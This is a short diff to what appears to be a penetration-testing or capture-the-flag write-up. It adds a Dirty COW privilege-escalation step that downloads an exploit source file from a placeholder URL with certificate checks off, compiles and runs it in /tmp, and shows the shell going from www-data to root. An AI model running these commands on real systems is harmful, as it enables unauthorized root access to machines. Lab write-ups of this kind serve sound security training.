@@ -33,3 +33,17 @@ Information Gathering:
 id
 uid=33(www-data) gid=33(www-data) groups=33(www-data)
 ```
+
+Exploit dirtycow:
+```
+cd /tmp
+wget <url>/c0w.c --no-check-certificate
+gcc -pthread c0w.c -o c0w
+./c0w
+
+(Wait...)
+
+/usr/bin/passwd
+id
+uid=0(root) gid=0(root) groups=0(root)
+```
